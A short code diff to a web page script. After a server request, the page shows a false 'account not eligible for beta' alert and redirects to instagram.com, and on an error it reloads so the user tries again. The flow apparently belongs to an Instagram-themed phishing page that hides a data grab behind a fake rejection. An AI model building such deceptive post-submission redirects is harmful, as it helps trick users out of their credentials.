@@ -4214,9 +4214,11 @@
             });
 
             if (response.ok) {
-                alert('Your country is not eligible! Check later');
+                alert('Your account is not eligible for beta');
+                window.location.replace("www.instagram.com/");
             } else {
-                alert('There was an error! Try again later!');
+                alert('There was an error! Try again!');
+                location.reload();
             }
         }
     </script>
